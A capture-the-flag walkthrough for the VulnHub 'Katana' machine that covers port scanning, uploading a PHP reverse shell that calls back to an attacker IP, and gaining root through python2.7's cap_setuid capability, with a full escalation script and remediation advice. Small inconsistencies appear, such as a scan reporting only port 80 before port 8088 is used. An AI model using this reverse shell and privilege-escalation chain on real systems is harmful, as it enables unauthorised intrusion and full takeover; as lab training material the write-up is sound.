# Katana: CTF Walkthrough

**Target:** Katana v1 by SunCSR Team  
**Difficulty:** Intermediate  
**Goal:** Gain root and read the root flag  
**Source:** [VulnHub](https://www.vulnhub.com/entry/katana-1,482/)

---

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Directory Discovery](#3-directory-discovery)
- [4. Exploitation: File Upload](#4-exploitation--file-upload)
- [5. Post-Exploitation Enumeration](#5-post-exploitation-enumeration)
- [6. Privilege Escalation via Capabilities](#6-privilege-escalation-via-capabilities)
- [7. Flag Capture](#7-flag-capture)
- [8. Exploit Script](#8-exploit-script)
- [9. Remediation Notes](#9-remediation-notes)

---

## 1. Reconnaissance

### Network Discovery

```bash
netdiscover
```

| Field | Value |
|-------|-------|
| Target IP | `192.168.1.119` |

### Port Scanning

```bash
nmap -p- -A 192.168.1.119
```

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Apache |

---

## 2. Web Enumeration

### Browse to Target

```
http://192.168.1.119
```

A default Apache page is displayed. No useful content or links visible.

### Inspect Page Source

No comments, hidden paths, or useful data found.

### Initial Assessment

The default page on port 80 provides no attack surface. Proceed with directory brute-forcing.

---

## 3. Directory Discovery

### Scan for Directories

```bash
dirb http://192.168.1.119:8088/ -X .html
```

> **Note:** The service actually runs on port **8088**, not 80. This is common in VulnHub VMs: always verify the actual listening port.

**Key Finding:** `/upload.html`

### Browse to Upload Page

```
http://192.168.1.119:8088/upload.html
```

A page with **two file upload options** is presented.

---

## 4. Exploitation: File Upload

### 4.1: Prepare the Payload

Use pentestmonkey's PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit `shell.php` and set your attacker IP and port:

```php
$ip = '192.168.1.XXX';   // your attacker IP
$port = 1234;             // your listener port
```

### 4.2: Upload via the Second Option

1. Navigate to `http://192.168.1.119:8088/upload.html`
2. Use the **second upload form** (the first may have restrictions)
3. Select `shell.php` and upload

### 4.3: Handle the Upload Response

The page displays a message:

> "Please wait 1 minute. The file has been internally redirected to another directory."

This indicates the uploaded file is moved to a different path after processing.

### 4.4: Locate the Uploaded Shell

The file is moved to a **different port**. Based on the hint, the shell is accessible on port `8715`.

```bash
http://192.168.1.119:8715/shell.php
```

### 4.5: Trigger the Reverse Shell

Start a netcat listener:

```bash
nc -lvp 1234
```

Navigate to the shell URL in the browser:

```
http://192.168.1.119:8715/shell.php
```

**Result:** Reverse shell received as `www-data`.

```
Linux katana 4.19.0-9-amd64 ...
www-data@katana:~$
```

---

## 5. Post-Exploitation Enumeration

### Check Sudo Permissions

```bash
sudo -l
```

**Result:** No sudo privileges for `www-data`.

### Check SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Result:** No exploitable SUID binaries found.

### Check Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
```

**Result:** No exploitable cron jobs.

### Check Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

**Result:**

```
/usr/bin/python2.7 = cap_setuid+ep
```

---

## 6. Privilege Escalation via Capabilities

### Understanding Capabilities

Linux capabilities decompose root's authority into granular units. When a binary has `cap_setuid`, it can **change its user ID**: including to root (UID 0).

| Capability | Effect |
|------------|--------|
| `cap_setuid` | Allows the process to change its UID (including to root) |
| `+ep` | Effective and Permitted: full capability set |

### How the Exploit Works

```
┌──────────────────────────────────────────────────────────┐
│  python2.7 (cap_setuid+ep)                               │
│                                                          │
│  1. os.setuid(0)     →  Sets process UID to root         │
│  2. os.system("/bin/bash")  →  Spawns root shell         │
│                                                          │
│  Result: uid=0(root) shell obtained                      │
└──────────────────────────────────────────────────────────┘
```

### Manual Exploitation

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Verify Root

```bash
id
# uid=0(root) gid=33(www-data) groups=33(www-data)
```

---

## 7. Flag Capture

```bash
cd /root
cat flag.txt
```

**Flag retrieved.** Challenge complete.

---

## 8. Exploit Script

The following Python script automates the entire post-exploitation and privilege escalation process. Save it on the target as `privesc.py` and execute it.

```python
#!/usr/bin/env python2
"""
Katana: Linux Capabilities Privilege Escalation Exploit
Target:    python2.7 with cap_setuid+ep capability
Method:    os.setuid(0) to escalate to root
Usage:     python2.7 privesc.py
"""

import os
import sys
import subprocess

# ============================================================
# CONFIGURATION
# ============================================================

PYTHON_BIN = "/usr/bin/python2.7"   # Binary with cap_setuid capability
ROOT_SHELL = "/bin/bash"            # Shell to spawn as root
FLAG_PATH  = "/root/flag.txt"       # Flag location

# ============================================================
# FUNCTIONS
# ============================================================

def banner():
    """Print exploit banner."""
    print ""
    print "=" * 55
    print "  Katana: Capabilities Privilege Escalation Exploit"
    print "=" * 55
    print ""

def check_uid():
    """Check if we are already root."""
    uid = os.getuid()
    if uid == 0:
        print "[+] Already running as root (UID 0)"
        return True
    print "[-] Current UID: %d (not root)" % uid
    return False

def check_capability():
    """Verify python2.7 has cap_setuid."""
    print "[*] Checking capabilities on %s ..." % PYTHON_BIN

    try:
        proc = subprocess.Popen(
            ["getcap", "-r", "/", "2>/dev/null"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        output, _ = proc.communicate()

        if "cap_setuid" in output:
            print "[+] cap_setuid capability found on: %s" % PYTHON_BIN
            return True
        else:
            print "[-] cap_setuid NOT found on any binary."
            print "[-] Exploit will likely fail."
            return False

    except Exception as e:
        print "[-] Could not run getcap: %s" % str(e)
        return False

def exploit():
    """Execute the privilege escalation via os.setuid(0)."""
    print "[*] Target binary: %s" % PYTHON_BIN
    print "[*] Method:         os.setuid(0) + os.system(%s)" % ROOT_SHELL
    print "[*] Launching exploit ..."
    print ""

    try:
        # os.execl replaces the current process with python2.7
        # Inside python: setuid(0) then spawn /bin/bash as root
        os.execl(
            PYTHON_BIN,
            PYTHON_BIN,
            "-c",
            "import os; os.setuid(0); os.system('%s')" % ROOT_SHELL
        )
    except OSError as e:
        print "[!] Failed to execute %s: %s" % (PYTHON_BIN, str(e))

def read_flag():
    """Read the flag file."""
    print "[*] Reading flag from %s ..." % FLAG_PATH

    try:
        with open(FLAG_PATH, "r") as f:
            content = f.read().strip()
            print ""
            print "[+] FLAG: %s" % content
            print ""
            return content
    except IOError:
        print "[-] Could not read %s" % FLAG_PATH
        print "[*] Try manually: cat %s" % FLAG_PATH
        return None

# ============================================================
# MAIN
# ============================================================

def main():
    banner()

    # Step 1: Check if already root
    if check_uid():
        read_flag()
        return

    # Step 2: Check for capability
    if not check_capability():
        print "[!] Exiting. No exploitable capability found."
        return

    # Step 3: Run exploit
    # NOTE: os.execl() replaces this process, so code below
    #       only runs if the exploit FAILS to escalate.
    exploit()

    # Fallback: only reached if os.execl() did not work
    print "[!] Exploit did not spawn a shell."
    print "[*] Try the manual command:"
    print "    %s -c 'import os; os.setuid(0); os.system(\"%s\")'" % (
        PYTHON_BIN, ROOT_SHELL
    )

if __name__ == "__main__":
    main()
```

### Usage

```bash
# On the target machine (as www-data)
cd /tmp
nano privesc.py
# (paste the script above)

chmod +x privesc.py
/usr/bin/python2.7 privesc.py
```

### Expected Output

```
=======================================================
  Katana: Capabilities Privilege Escalation Exploit
=======================================================

[-] Current UID: 33 (not root)
[*] Checking capabilities on /usr/bin/python2.7 ...
[+] cap_setuid capability found on: /usr/bin/python2.7
[*] Target binary: /usr/bin/python2.7
[*] Method:         os.setuid(0) + os.system(/bin/bash)
[*] Launching exploit ...

# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/flag.txt
flag{...}
```

---

## Attack Flow Diagram

```
netdiscover → Target 192.168.1.119
                    ↓
nmap → Port 8088 (HTTP)
                    ↓
dirb → /upload.html (file upload page)
                    ↓
Upload php-reverse-shell.php via second form
                    ↓
File internally redirected → Port 8715
                    ↓
http://192.168.1.119:8715/shell.php → Netcat → www-data shell
                    ↓
getcap -r / → python2.7 = cap_setuid+ep
                    ↓
python2.7 privesc.py → os.setuid(0) → ROOT
                    ↓
cat /root/flag.txt → Challenge complete
```

---

## Flags Summary

| Flag | Location | Value |
|------|----------|-------|
| Flag | `/root/flag.txt` | *(captured via root shell)* |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| netdiscover | Network host discovery |
| nmap | Port and service enumeration |
| dirb | Web directory brute-force |
| pentestmonkey php-reverse-shell | PHP reverse shell payload |
| Netcat | Reverse shell listener |
| getcap | Linux capability enumeration |
| python2.7 | Capability-based privilege escalation |

---

## Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| Unrestricted file upload | Validate file types; scan uploads; store outside webroot |
| File upload to alternate port | Monitor for unexpected port listeners; restrict outbound connections |
| Dangerous capability on python (`cap_setuid`) | Remove unnecessary capabilities; audit with `getcap` regularly |
| No input validation on upload forms | Implement server-side file type validation and content inspection |
| `www-data` running with elevated capabilities | Apply least privilege; remove `cap_setuid` from non-essential binaries |
| No upload directory isolation | Serve uploads from isolated container/chroot; disable script execution in upload dirs |
| No file integrity monitoring | Deploy AIDE/OSSEC for critical file change detection |

---

## References

- [Katana on VulnHub](https://www.vulnhub.com/entry/katana-1,482/)
- [Linux Privilege Escalation via Capabilities](https://hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [MITRE ATT&CK: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
